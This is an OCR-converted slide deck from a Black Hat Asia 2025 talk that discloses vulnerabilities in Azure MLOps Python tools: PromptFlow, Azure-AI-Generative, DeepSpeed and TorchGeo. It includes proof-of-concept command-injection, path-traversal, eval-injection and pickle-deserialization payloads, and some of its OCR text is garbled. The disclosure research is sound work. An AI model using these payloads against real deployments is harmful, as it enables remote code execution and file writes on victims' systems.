---
title: "The Oversights Under the Flow Discovering and Demystifying the Vulnerable Tooling Suites From Azure MLOps"
speakers: ["Peng Zhou"]
conference: "Black Hat"
conference_full: "Black Hat ASIA 2025"
edition: "ASIA"
year: 2025
source_pdf: "Black Hat Asia 2025 Slides/Peng Zhou_The Oversights Under the Flow Discovering and Demystifying the Vulnerable Tooling Suites From Azure MLOps.pdf"
pages: 75
sha256: "f6e7bdf9173ad51f655c5c666f06b3d5d9e4d7a810f1f8758c9aa2772d2cfac7"
text_chars: 38089
ocr_pages: 28
has_ocr: true
companion_files: []
extractor: "pymupdf4llm 1.28.2 + tesseract"
converted_at: "2026-08-11T21:07:58Z"
---
# The Oversights Under the Flow Discovering and Demystifying the Vulnerable Tooling Suites From Azure MLOps

**Speakers:** Peng Zhou  
**Conference:** Black Hat ASIA 2025  
**Source:** `Black Hat Asia 2025 Slides/Peng Zhou_The Oversights Under the Flow Discovering and Demystifying the Vulnerable Tooling Suites From Azure MLOps.pdf` (75 pages)

## Slide 1

The Oversights under The Flow Discovering and Demystifying the Vulnerable Tooling Suites from Azure MLOps Peng Zhou (zpbrent@gmail.com) Shanghai University

#BHAS @BlackHatEvents

## Slide 2

## whoami

Peng Zhou (zpbrent)

- Associate Professor at Shanghai University

- Bug Hunter for Web/3 and AI/LLM OSS Vulnerabilities

- Reach me out at: <u>https://zpbrent.github.io/</u>

#BHAS @BlackHatEvents

## Slide 3

## Agenda

- The Flow for Azure MLOps

- The Tooling Suites We Focus

- The Oversights, Vulnerabilities, and Impacts

- Oversights within Coordinated Disclosure

• Countermeasure & Takeaway

#BHAS @BlackHatEvents

## Slide 4

## Agenda

- The Flow for Azure MLOps

- The Tooling Suites We Focus

• The Oversights, Vulnerabilities, and Impacts

• Oversights within Coordinated Disclosure

• Countermeasure & Takeaway

#BHAS @BlackHatEvents

## Slide 5

### The Flow for Azure DevOps

#BHAS @BlackHatEvents

[1] https://azure.microsoft.com/en-us/products/devops/

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
pisek hat
ASIA 2025
The Flow for Azure DevOps
Azure Repos Azure Artifacts
3ejagdO
Azure Pipeline Azure Test Plans
[1] https://azure.microsoft.com/en-us/products/devops/
```

## Slide 6

### From DevOps to MLOps

#BHAS @BlackHatEvents

[2] https://azure.microsoft.com/en-us/blog/mlops-blog-series-part-1-the-art-of-testing-machine-learning-systems-using-mlops/

## Slide 7

### The ML Flow in Azure MLOps

Training

Testing

Evaluation

Synthesis

#BHAS @BlackHatEvents

[3] https://www.c-sharpcorner.com/blogs/mlops

## Slide 8

## Agenda

• The Flow for Azure MLOps

• The Tooling Suites We Focus

• The Oversights, Vulnerabilities, and Impacts

• Oversights within Coordinated Disclosure

• Countermeasure & Takeaway

#BHAS @BlackHatEvents

## Slide 9

### Azure AI+ML Architecture

Azure OpenAI
MLOps LLM enabled
deploy
Azure Machine Learning Workspace Azure APPs
DevOps
On-premise Networks End users

#BHAS @BlackHatEvents

[4] https://learn.microsoft.com/en-us/azure/cloud-adoption-framework/ready/azure-best-practices/ai-machine-learning-enterprise-security

## Slide 10

### Vulnerable Tooling Suites: Overview

#BHAS @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
2)
black hat
ASIA 2025
Vulnerable Tooling Suites: Overview
Install
Install
«
Run
Our Focus
Development/AI/ML Tools/SDKs in Python
f S deepspeed
of e
PromptFlow <3 TorchGeo
+ Alr. Azure-AlI-Generative
,
EI “»
»
```

## Slide 11

### MLOps = Machine Learning + DevOps

#BHAS @BlackHatEvents

## Slide 12

### Vulnerable Tooling Suites in Azure MLOps

#BHAS @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
pisek hat
ASIA 2025
Vulnerable Tooling Suites in , Azure MLOps
deepspeed “a a orem
PromptFlow PromptFlow rom ow
° AIP Azure-AlI-Generative
<3 TorchGeo TAF Azure-AlI-Generative .
deepspeed &S :. TorchGeo
SS ‘
w4 deepspeed cK is a)
PromptFlow
```

## Slide 13

## Agenda

• The Flow for Azure MLOps

• The Tooling Suites We Focus

• The Oversights, Vulnerabilities, and Impacts

• Oversights within Coordinated Disclosure

• Countermeasure & Takeaway

#BHAS @BlackHatEvents

## Slide 14

### Prompt Flow in Azure ML

**Build high-quality LLM apps - from prototyping, and testing to production deployment and monitoring**

#BHAS @BlackHatEvents

[5] https://learn.microsoft.com/en-us/azure/machine-learning/prompt-flow/overview-what-is-prompt-flow?view=azureml-api-2

## Slide 15

### Example in Azure ML Workspace

**The core feature for Azure ML Studio & A Tool for Azure MLOps**

#BHAS @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
2)
black hat
ASIA 2025
Example in Azure ML Workspace
The core feature for Azure ML Studio & A Tool for Azure MLOps
"8s standard flow
Create
Flow
+ UM + @Prompt + @ Python
v Inputs (
Name Type Value
ud ring tte
badd
v Outputs
Name Valu
itout.category}
evidenc evidence)
badd
Vv Code
Chat flow
Create
,
HH | Evaluation flow
Create
inputs
®  fetch_text_content_from_url
,
es
& summarize_text_content
® prepare_examples
_¥
& classify with_llm
’
® convert_to_dict
outputs
F 4
PromptFlow
```

## Slide 16

### Oversight #1: Vulnerable Code

#BHAS @BlackHatEvents

[6] https://github.com/microsoft/promptflow/blob/718a2c0b632cd93b9f338f635db1a09bf3c02179/src/promptflow-devkit/promptflow/sdk/orchestrator/utils.py#L525

## Slide 17

### Oversight #1: Command Injection

join() calls back the bug

#BHAS @BlackHatEvents

[6] https://github.com/microsoft/promptflow/blob/718a2c0b632cd93b9f338f635db1a09bf3c02179/src/promptflow-devkit/promptflow/sdk/orchestrator/utils.py#L525

## Slide 18

### Oversight #1: Secure Cases in Codebase

#BHAS @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
2)
black hat
ASIA 2025
Oversight #1: Secure Cases in Codebase
154 v
155
156
157
"--port", type=int,
def _get_process_by_port(port):
85
86
87
88
if platform.system() == "Windows":
command = f"netstat -ano | findstr :{port}"
result = subprocess.run(command, shell=True, capture_output=True, text=True)
309 Vv def _start_background_service_on_unix(port, service_host):
310 cmd = [
311 "“waitress-serve",
312 #"--listen={service_host}:{port}",
313 f"--threads={PF_SERVICE_WORKER_NUM}",
314 "“promptflow._cli._pf._service:get_app",
315 ]
316 logger. debus(f"Start prompt flow service in Unix: {cmd}")
317 subprocess.Popen(cmd, stdout=subprocess.DEVNULL, start_new_session=True)
if sys.executable.endswith("pfcli.exe"):
cmd
process
stdout,
["pfcli"] + cmd
subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, shell=True)
_ = process. communicate()
F 4
PromptFlow
```

## Slide 19

### Oversight #1: Code Path

#BHAS @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
black hat
ASIA 2025
Oversight #1: Code Path >
PromptFlow
N
8
v k1ass ExperimentOperations (Telemetry
Nv
ExperimentOperations.
Source
V | class PFClient:
def start(self, experiment: Experime stream=False, inputs=None, **kwargs) -> Experiment:
40 tient class to interact with prompt flow entities. won
o 9 Start an experiment.
4aav def init_(self, **kwargs) -
43 lodger.debug("PFClient init with kwargs: %s", kwargs) 1 if stream:
44 # this is set, telemetry from this ent will use this user agent and ignore the one #r¢ 137 return ExperimentOrchestrator(self._client, riment).start(**kwargs)
45 self \user_agent_override = kwargs.pop(USER_AGENT_OVERRIDE_KEY, None) 138 else:
46 self. Nonnection_provider = kwargs.pop("connection_provider", None) 139 return ExperimentOrchestrator(self._client, experimgn#).async_start(*
4 self._Anfig = Configuration(overrides=kwargs.get("config", None) or {})
48 s used as an option to override
49 # DefaultQzureCredential when using workspace connection provider Inject Point
50 self. tial = kwargs.get("credential", None)
St 404 Vv def async_start(self, exequtable_path=NonP, nodes=None, ffom_nodes=None, attempt=None, **kwargs):
52 1 be applied to all TelemetryMixin operations 405 us execution of EF -EYSERIFERE”
53 self._runs = R\nOperations(self, user_agent_override=self._user_agent_override) 406
aint - * ; = = Meneeifranoer= = “* 407 :palfam executable_path: Python path when executing the experiment.
55 self._experiments = ExperimentOperations(self, user_agent_override=self._user_agent_override)
408 rtype executable_path: str
4e9 :palfam nodes: Nodes to be executed.
433 ars = [executable path, _file_, "start", "--experiment", self.experiment.name]
434 iffnodes:
435 _params_inject_validation(nodes, “nodes”)
436 args = args + ["--nodes"] + nodes
437 from_nodes:
438 _params_inject_validation(from_nodes, "from-nodes")
520 Et APerimert—artit 439 args = args + ["--from-nodes"] + from_nodes
521 “| def _start_process_in_background(args, executable_path=None): 440 kwargs.get("session"):
522 platform.system() == Windows” 441 _params_inject_validation(kwargs.get("session"), “session")
523 os. spawnve(os.P_DE » executable_path, args, os.environ) args = args + ["--session", kwargs.get("session")]
524 = arfs = args + ["--attempt", str(index)]
525 subprocess.Popen(" ".join(["nohup"] + args + ["&"]), shell=True, env=os.environ) # Yrart an orchestrator process using detach mode
, 445 logger debue(f"Start experiment {self experiment name} in background.)
Sink 446 _start_process_in_background(args, executable_path)
447 Feturn seit. experiment
```

## Slide 20

### Oversight #1: Affecting Experimentation

#BHAS @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
pisek hat
ASIA 2025
Oversight #1: Affecting Experimentation . _ P?
2. Experimentation
Run flow against
sample data
Modify flow (prompts
and tools etc)
If satisfied
```

## Slide 21

### Oversight #1: PoC

#BHAS @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Oversight #1: PoC >
PromptFlow
from promptflow.client import PFClient
from promptflow._sdk._ constants import EXPERIMENT_CREATED_ON_INDEX_NAME, EXPERIMENT_TABLE_NAME, LOCAL_MGMT_DB_PATH
from promptflow._sdk._orm import Experiment, mgmt_db_session
from promptflow._sdk._orm.session import create_index_if_not_exists, create_or_update_table
from promptflow._sdk.entities. experiment import CommandNode, Experiment, ExperimentData, ExperimentInput, FlowNode
from promptflow._sdk._load_functions import _load_experiment_template
from sqlalchemy import create_engine
# victim setup
mgmt_db_session()
engine = create_engine(f"sqlite:///{str(LOCAL_MGMT_DB_PATH)}", future=True)
create_or_update_table(engine, orm_class=Experiment, tablename=EXPERIMENT_TABLE_NAME)
create_index_if_not_exists(engine, EXPERIMENT_CREATED_ON_INDEX_NAME, EXPERIMENT_TABLE_NAME, “created_on")
pf = PFClient()
template = _load_experiment_template(source='promptflow/src/promptflow/tests/test_configs/experiments/basic-no-script-template/basic.exp.yaml' )
experiment = Experiment.from_template(template)
# attack step
bad_command = ‘;touch /tmp/hacked;'
experiment = pf._experiments.start(experiment, nodes=[bad_command])
```

## Slide 22

### Oversight #1: Vulnerable Flow in Azure

[;touch /tmp/hacked;]

Vulnerable Experimentation in the Prompt Flow as PoC

#BHAS @BlackHatEvents

## Slide 23

### Oversight #2: Vulnerable Code

#BHAS @BlackHatEvents

[7] https://github.com/microsoft/promptflow/blob/718a2c0b632cd93b9f338f635db1a09bf3c02179/src/promptflow-devkit/promptflow/_sdk/_service/apis/ui.py#L74

## Slide 24

### Oversight #2: Secure Cases in Codebase

#BHAS @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
2)
black hat
ASIA 2025
Oversight #2: Secure Cases in Codebase —_ >
PromptFlow
12 werkzeug.utils import safe_join
91 safe_path = safe_join(str(flow), PROMPT_FLOW_DIR_NAME)
109 safe_path = safe_join(str(flow), image_path)
130 flow_path = safe_join(str(flow),
args = media_save_parser.
87 flow = decrypt_flow_path(args.flow)
88 flow, _ = resol low_path( flow)
89 base64_data = args.base64_data
92 extension = args.extension
91 safe_path = safe_join(str(flow), PROMPT_FLOW_DIR_NAME)
106 flow = )
107 flow,
108 image_path = args.image path
109 safe_path = safe_join(str(flow), image_path)
128 else:
129 flow, _ = resolve_flow_path(flow)
130 flow_path = safe_join(str(flow), experiment)
```

## Slide 25

Oversight #2: Path Traversal to AFW

Why not use safe_join()

#BHAS @BlackHatEvents

[7] https://github.com/microsoft/promptflow/blob/718a2c0b632cd93b9f338f635db1a09bf3c02179/src/promptflow-devkit/promptflow/_sdk/_service/apis/ui.py#L74

## Slide 26

### Oversight #2: Vulnerable Code Path

#BHAS @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
2)
black hat
ASIA 2025
Oversight #2: Vulnerable Code Path —_ >
: PromptFlow
80 @api.ro ' . :
a ep Source usage: pf [-h] [-v] {config,connection,flow,run,tool,trace,service,upgrade}
81 v
82 pf: manage prompt flow assets. Learn more: https://microsoft.github.io/promptflow.
83
positional arguments:
“ {config, connection, flow, run,tool, trace, service, upgrade}
85 Vv de S fF): config Manage configs.
8¢ ve_parser.pa connection Manage connections.
. - flow Manage flows.
87 flow_path(args. flow) 8
- ~ run Manage runs.
8S tool Manage tools.
89 args.base64_data trace Manage traces.
90 extension = args.extension | Inject Point service SSIEISE BRED flow service.
- . _ upgrade Upgrade prompt tiow cri.
91 safe_path = r(flow), MPT_FL 7
92 if safe_path is None:
message = f"The untrusted path {P detected!"
ion(message)
(safe_path, base64_data, extension)
" to(flow)
0
r
cy
et
H
0
70 “ def save_image(directory, base64_data, extension):
71 image_data = base64.b64decode(base64_data)
72 hash_object = hashlib.sha256(image_data)
73 filename = hash_object.hexdigest()
74 file_path = Path(directory) / f"{filename}.{extension}"
75 with open(file_path, "“wb") as f:
76 #.write(image_data) Sink
77 return file_path
```

## Slide 27

### Oversight #2: PoC

###### **`pf config set service.host="0.0.0.0"` &&** **`pf service start`**

**Victim Setup Attack Step**

#BHAS @BlackHatEvents

## Slide 28

### Oversight #2: Remote or Local?

#BHAS @BlackHatEvents

[8] https://github.com/microsoft/promptflow/issues/3432

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
2)
black hat
ASIA 2025
Oversight #2: Remote or Local?
LL engrogerio opened on Jun 18 edited by engrogerio - Edits ~ ++
I can not serve to host 0.0.0.0.
Is that possible to implement a easy way to change constant.PF_SERVICE_HOST to another value?
[Today if you change _constant.PF_SERVICE_HOST, it will be overwritten to 127.0.0.1 before the server starts.
©
© _ sh engrogerio added enhancement on Jun 18
& -& 0mza987 assigned YingChen1996 on Jun 19
Contributor edited by YingChen1996 - Edits ~
® Vingchent996 on Jun 20
@engrogerio + Thanks for reporting the issue.
May | double confirm the scenario you mentioned above is local prompt flow service (pf service start) or prompt flow serve (pf flow serve)?
And may | ask how do you change the PF_SERVICE_HOST, do you modify the corresponding source code?
Btw, in what scenarios do you need to change the host value?
©
& YingChen1996 on Jul 9
Add config pfs host feature and will release it in the next public version.
©
[8] https://github.com/microsoft/promptflow/issues/3432
My code starts the trace :
@trace
def chat(question: str =
"Flow entry function
at's the capital of France?") -> str:
if “OPENAI_API_KEY" not in os.environ and “AZURE_OPENAI_API_KEY" not in os.environ
# load environment variables from .env file
load_dotenv()
prompty = Prompty.load(source=BASE_DIR / “chat. prompty”)
# trigger a 11m call with the prompty obj
output = prompty(question=question)
return output
| changed the PF_SERVICE_HOST like:
constants_file_path = os.path.abspath(promptflow.constants.__file__)
command = #'sudo chmod 755 {constants_file_path}"
exit_status = os.system(command)
search_and_replace(constants_file_path, ‘PF_SERVICE_HOST = "127.0.0.1"",
My scenario is: | am using promptflow on a Posit Connect deployed application,
© a1
*PF_SERVICE_HOST = "@.0.0.0"')
F 4
PromptFlow
```

## Slide 29

### Oversight #2: Remote or Local?

0-click local  ->  1-click remote

#BHAS @BlackHatEvents

[9] https://snyk.io/blog/visual-studio-code-extension-security-vulnerabilities-deep-dive/

## Slide 30

### Oversight #2: Remote PoC

Written by GitHub Copilot with GPT-4o

**1-click**

#BHAS @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
2)
black hat
ASIA 2025
Oversight #2: Remote PoC | _ | a >
Written by GitHub Copilot with GPT-4o0
PromptFlow
<!DOCTYPE html><html lang="en"><b
1-click meg | <button id="triggerButton">Run Script</button>
<script>
document. getElementById('triggerButton').addEventListener('click’, function () {
const flowPath = btoa('/Users/test_flow');
const url = “http://192.168.3.203:23333/v1.0/ui/media_save?flow=${ Path} 5
const payload = {
base64_data: btoa('hacked data\n'),
extension: '/../../../../Windows/System32/hacked.d1l1'
}3
fetch(url, {
method: ‘POST’,
headers: {
Content-Type’: ‘application/json'
}
body: JSON.stringify (payload)
}).then(response => response.json()).then(data => console.log(data) )
-catch(error => console.error(‘Error:', error));
})
```

## Slide 31

### Client-side SDK for Azure AI Studio

###### **Azure-AI-Generative is the Client-side SDK Library for Python**

**For building, evaluating, and deploying Generative AI applications that leverage Azure AI services in Azure AI/ML Studio**

#BHAS @BlackHatEvents

[9] https://pypi.org/project/azure-ai-generative/

## Slide 32

### Oversight #3: Vulnerable Code

#BHAS @BlackHatEvents

[10] https://github.com/Azure/azure-sdk-for-python/blob/ccaf592492ad7e5973b32f348f7a2c2a4a962a05/sdk/ai/azure-ai-generative/azure/ai/generative/synthetic/simulator/_model_tools/models.py#L275

## Slide 33

### Oversight #3: Secure Cases in Codebase

#BHAS @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
2)
black hat
ASIA 2025
Oversight #3: Secure Cases in Codebase rT.
187 if "“registries/azureml-meta" in model details.id:
188 allowed_skus = ast.literal_eval(model details.tags["“inference_compute_allow_list"])
189 # Check aVailable quota tor each sku in the allowed sku list
190 # pick the sku that has available quota and is the cheapest
191 vm_sizes = self. _ml_client.compute. _vmsize operations. list(
192 location=self._ml_client.compute. get _workspace_location()
193 )
218 response = response.replace("false", "“False")
219 response = response.replace("true", "“True")
220 parsed response = literal _eval(response)
221 result = {}
279 try:
280 harm_response = literal _eval(response[metric_name])
281 except Exception: # pylint: disable=broad-exception-caught
282 harm_response = response[metric_name]
```

## Slide 34

### Oversight #3: Code Injection

Why not use literal_eval()

#BHAS @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
bisek hat
ASIA 2025
Oversight #3: Code Injection . ry
221 Vv] class OpenAICompletionsModel(LLMBase):
238 Vv def _init_(
239 self, *,
252 presence penalty: Optional[float] = @,
253 stop: Optional[Union[List[str], str]] = None,
254 image captions:|Dict[str, str] = {},
270 # Default stop fo end token if not provided
271 if not stop:
272 stop = []
273 # Else if stop bequence is given as a string (Ex: "["\n", "<im_end>"]"), convert
274 elif type(stop)vis str and stop.startswith("[") and stop.endswith("]"):
275 stop = eval(stop)
276 elif type(stop) is str: g
277 stop = [stop] ° a i P-
O Q
_Why not use literal_eva
```

## Slide 35

### Oversight #4: More Similar Cases

[11] https://github.com/Azure/azure-sdk-for-python/blob/a61273f855bd2f3de24906a392bed20374f2c770/sdk/ai/azure-ai-generative/azure/ai/generative/evaluate/pf_templates/built_in_metrics/chat/construct_groundedness_request.py#L32 [12] https://github.com/Azure/azure-sdk-for-python/blob/a61273f855bd2f3de24906a392bed20374f2c770/sdk/ai/azure-ai-generative/azure/ai/generative/evaluate/pf_templates/built_in_metrics/chat/parse_groundedness_responses.py#L13

[13] https://github.com/Azure/azure-sdk-for-python/blob/a61273f855bd2f3de24906a392bed20374f2c770/sdk/ai/azure-ai-generative/azure/ai/generative/evaluate/pf_templates/built_in_metrics/chat/parse_service_response.py#L16-L24

[14] https://github.com/Azure/azure-sdk-for-python/blob/a61273f855bd2f3de24906a392bed20374f2c770/sdk/ai/azure-ai-generative/azure/ai/generative/evaluate/pf_templates/built_in_metrics/qa/parse_service_response.py#L15-L23

#BHAS @BlackHatEvents

## Slide 36

### Oversight #3-#4: Code Path Example

###### **Source**

Sink

Sink

#BHAS @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
bisek hat
ASIA 2025
N
a
m
+h
a=]
pe]
7]
w
m
Ww
Single sample(response: dict,
1 from promptflow import tool 8 etected-metriess/ dict) -> list:
2 from typing import List selected_label|k = selected_metrics["safety_metrics"]
3 import numpy as np parsed_respons¢
4 import re for key in res#ons
harm_type + key\replace("_fairness", "_unfairness”")
7 cost Source if selected labe\ keys[harm_type]
parsed fFrarm_response = {}
73 “| def parse_response(batch_response: List[dict],
74 selected_label_keys: dict) -> Ligt[List[dict]]: trys
55 = Sink harM_response = eval(response[key])
76 parsed_response = [] except WameError as e:
7 for single_sample_response in‘w@tch_response: # fIx the eval error if there's "true" in the response
78 try: 19 m =|re.findall("name '(.+)' is not defined", str(e))
79 parsed single sample response = parse single sample( 20 if m:
80 ingte—sampte response, setected tabet keys) 21 for word in m:
81 except Exception: 22 response[key] = response[key].replace(word,
82 parsed_single sample_response = [] 3 v word.title())
83 parsed_response.append(parsed_single sample response) 2A Sink harm response = eval(response[key])
84 return parsed_response
```

## Slide 37

### Oversight #3-#4: Affecting Evaluation

#BHAS @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
bisek hat
ASIA 2025
Oversight #3-#4: Affecting Evaluation fan}
3. Evaluation & Refinement
Run flow against
If satisfied
```

## Slide 38

### Oversight #3-#4: PoC (A Simple Example)

#BHAS @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
2)
black hat
ASIA 2025
Oversight #3-#4: PoC (A Simple Example) | far
from azure.ai.generative.evaluate.pf_templates.built_in_metrics.chat import construct_groundedness request as cgr
parsed_chat={"questions":["ok?"], "“answers":["yes"], "“retrieved_documents":["__import__(‘os').system( ‘touch /tmp/hacked' )"]}
cgr.construct_groundedness_requests(parsed_chat)
```

## Slide 39

### Oversight #3-#4: Vulnerable Flow in Azure

Just a
Concept PoC
"__import__('os').system('touch /tmp/hacked')"

Vulnerable Evaluation in the Prompt Flow as PoC

#BHAS @BlackHatEvents

## Slide 40

### DeepSpeed for Model Training

###### **DeepSpeed is a deep learning optimization library that makes distributed training and inference easy, efficient, and effective**

#BHAS @BlackHatEvents

[15] https://www.deepspeed.ai/tutorials/pipeline/

## Slide 41

### Oversight #5: Vulnerable Code

#BHAS @BlackHatEvents

[16] https://github.com/microsoft/DeepSpeed/blob/10ba3dde84d00742f3635c48db09d6eccf0ec8bb/deepspeed/runtime/pipe/p2p.py#L136

## Slide 42

### Oversight #5: Vulnerable Code Path

###### **Pickle Deserialization**

#BHAS @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
2)
black hat
ASIA 2025
Oversight #5: ulnerable Code Path deepspeed
import deepspeed
import deepspeed.runtime.pipe.p2p as p2p
deepspeed.init_distributed(dist_backend="gloo", init_method="tcp:
p2p.recv_obj(sender=0)
619 4 def init_distributed(dist_backend=None, 119 }V def recv_obj(sender: int) -> typing.Any:
= 120 from ~~ sender*~
//0.0.0.0:29500", rank=1, world _size=2, auto_mpi_discovery=False)
620 auto_mpi_discovery=True,
621 distributed_port=TORCH_DISTRIBUTED_DEFAULT_PORT,
— 122 WARN: This incur a CPU <-> GPU transfers and should be used sparingly
622 verbose=True,
- 123 for performance reasons.
623 timeout=default_pg timeout,
124
624 init_method=None,
~ 125 Args:
- dist_init_required-None, 126 sender (int): The rank sending the message.
626 config=None, 127 non
627 rank=-1, 128 # Get message meta
628 world_size=-1): 129 length = torch.tensor([@], dtype=torch. long) .to(get_accelerator().device_name())
629 ‘'* Initialize dist backend, potentially performing MPI discovery if needed 130 dist.recv(length, src=sender)
—»>
131
642 global cdb 132 # Receive and deserialize
643 133 msg = torch.empty(length.item(), dtype=torch.uint8).to(get_accelerator().device_name())
644 configure(deepspeed_config=config) 134 dist.recv(msg, src=sender)
135
136 msg = pickle.loads(msg.cpu().numpy().tobytes())
Pickle Deserialization
```

## Slide 43

### Oversight #5: Inherit from PyTorch

deepspeed.comm.recv() TorchBackend.recv()

#BHAS @BlackHatEvents

[17] https://github.com/microsoft/DeepSpeed/blob/10ba3dde84d00742f3635c48db09d6eccf0ec8bb/deepspeed/comm/torch.py#L90

## Slide 44

### Oversight #5: Distributed Computing

NIC NIC
host 1 host 2

#BHAS @BlackHatEvents

[18] https://github.com/pytorch/pytorch/blob/d90c25e3e22e369b1ca8aff2509c26afebc82324/torch/distributed/distributed_c10d.py#L265-L271

## Slide 45

### Oversight #5: Multiprocessing in PyTorch

#BHAS @BlackHatEvents

[19] https://pytorch.org/docs/stable/multiprocessing.html

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
blackhat by 3 =
ASIA 2025 . 4 *
Oversight #5: Multiprocessing in PyTorch deepspeed
Jocs > Multiprocessing package - torch.multiprocessing >-
Multiprocessing package - torch.multiprocessing
torch.multiprocessing is a wrapper around the native multiprocessing module.
It registers custom reducers, that use shared memory to provide shared views on the same data in different processes. Once
the tensor/storage is moved to shared_memory (see share_memory_() ), it will be possible to send it to other processes
without making any copies.
[19] https://pytorch.org/docs/stable/multiprocessing.html
```

## Slide 46

### Oversight #5: Multiprocessing in PyTorch

**The known issue in PyTorch’s Distributed**

#BHAS @BlackHatEvents

[20] https://github.com/pytorch/pytorch/blob/d90c25e3e22e369b1ca8aff2509c26afebc82324/torch/distributed/distributed_c10d.py#L265-L271

## Slide 47

### Oversight #5: Torch.Distributed Differs

**Enable Network Communication**

#BHAS @BlackHatEvents

[21] https://pytorch.org/docs/stable/distributed.html#basics

## Slide 48

### Oversight #5: Threat Model

#BHAS @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
bisek hat
ASIA 2025
Oversight #5: Threat Model | deepspeed
rank=0
export MASTER_PORT=29500
method= “tcp://192.168.3.153:29500”
deepspeed. init_distributed(init_method=method, rank=0)
p2p.recv_obj(sender=1)
—
rank=1,tensor() _= — Due to the time-intensive training work rank=1, payload()
_ — by the true rank=1, the attacker may
_ _ take the front-running and masquerade
rank=1 _~ as rank=1 to exploit attacker
export MASTER_ADDR=192.168.3.153 export MASTER_ADDR=192.168.3.153
class payload:
def __reduce__(self):
method= “tcp://192.168.3.153:29500” return (__import__(‘os').system, (“touch /tmp/hacked",))
deepspeed. init_distributed(init_method=method, rank=1)
p2p.send_obj(msg=tensor(), dest=0) method= “tcp://192.168.3.153:29500”
deepspeed. init_distributed(init_method=method, rank=1)
p2p.send_obj(msg=payload(), dest=0)
```

## Slide 49

**Victim**

### Oversight #5: PoC Demo

**Attacker**

**Get the video at: https://zpbrent.github.io/pocs/deepspeed/remote_demo.mp4**

#BHAS @BlackHatEvents

## Slide 50

### Oversight #5: Local or Remote?

###### **MSRC response**

#BHAS @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
pisek hat
ASIA 2025
Oversight #5: Local or Remote? Z, deepspeed
MSRC response
Hi Peng!
Thanks again for reporting this to us. After further investigation, we still found this to require
access through the local network, as calling 192.168.x.x is not possible from the external
internet. This access requires man-in-the-middle connection or guessing a wifi password, etc.
which is why this is assessed as a low severity based on our
```

## Slide 51

### Oversight #5: Local or Remote?

**Maybe, some misunderstanding or the victims rarely use DeepSpeed like this way!**

#BHAS @BlackHatEvents

## Slide 52

### Oversight #5: Recall the 1-Click Trick

0-click local  ->  1-click remote

#BHAS @BlackHatEvents

[9] https://snyk.io/blog/visual-studio-code-extension-security-vulnerabilities-deep-dive/

## Slide 53

Oversight #5: Idea to Remote PoC

Gloo/MPI/NCCL

**Reverse Engineering**

Web Socket

**JavaScript**

Pickle String

**Payload**

#BHAS @BlackHatEvents

## Slide 54

### Oversight #6: TorchGeo for Geospatial Data

###### **TorchGeo: datasets, samplers, transforms, and pre-trained models for geospatial data**

#BHAS @BlackHatEvents

[21] https://github.com/microsoft/torchgeo

## Slide 55

### Oversight #6: Vulnerable Code

#BHAS @BlackHatEvents

[22] https://github.com/microsoft/torchgeo/blob/7500ee20f651e889e4028ae897d245b4ad9ef82e/torchgeo/models/api.py#L113

## Slide 56

### Oversight #6: Copy-and-Paste

#BHAS @BlackHatEvents

[23] https://github.com/microsoft/torchgeo/pull/2323

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
bisek hat
ASIA 2025
Oversight #6: Copy-and-Paste 3 TorchGeo
Removing eval in model weight API #2323
adamjstewart merged 7 commits into main from b
Q) Conversation 5 > Commits 7 & Checks 18 Files changed 2
x (Don Sep 28
es) calebrob6 commented on Sep 27 + edited + Member
Removing use of eval.
getomedel_neights -andtremove- ight - Nevermind, | understand it now.
get_weight(...) allows a user to pass a string "ResNet18_Weights.LANDSAT_ETM_SR_MOCO" and get back the object
ResNet18_Weights.LANDSAT_ETM_SR_MOCO WeightEnum. Previously we did this with eval("ResNet18_Weights.LANDSAT_ETM_SR_MOCO")
which is bad. This proposed fix simply iterates through all available WeightEnums to look for matches and has the benefit of
raising an error that makes sense if there is no match (vs. the eval(...) which would do whatever).
©
Py adamjstewart commented on Sep 27 Collaborator
Most of this API was copied from torchvision, let me check what their code looks like these days. <a
©
Py adamjstewart commented on Sep 27 Collaborator
| wonder if we can use torchvision's @register_model decorator and remove this entire file. Timm also has a way to register
models, although | don't know how compatible it is. But it would let us easily use our custom models in our trainers.
©
[23] https://github.com/microsoft/torchgeo/pull/2323
```

## Slide 57

### Oversight #6: Copy-and-Paste

#BHAS @BlackHatEvents

[24] https://github.com/pytorch/vision/blob/main/torchvision/models/_api.py#L108

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
2)
black hat
ASIA 2025
Oversight #6: Copy-and-Paste
calebrob6 commented on Sep 28 Member Author ***
| looked at the torchvision version (https://github.com/pytorch/vision/blob/main/torchvision/models/_api.py#L108) and it seems
more hacky than what I've implemented here. | updated the PR description with more details.
©
108 V def get_weight(name: str) -> WeightsEnum:
118 try:
119 enum_name, value_name = name.split(".")
120 t ValueError:
121 raise ValueError(f"Invalid weight name provided: ‘{name}'.")
122
123 base_module_name = “.".join(sys.modules[__name__].__name__.split(".")[:-1])
124 base_module = importlib.import_module(base_module_name)
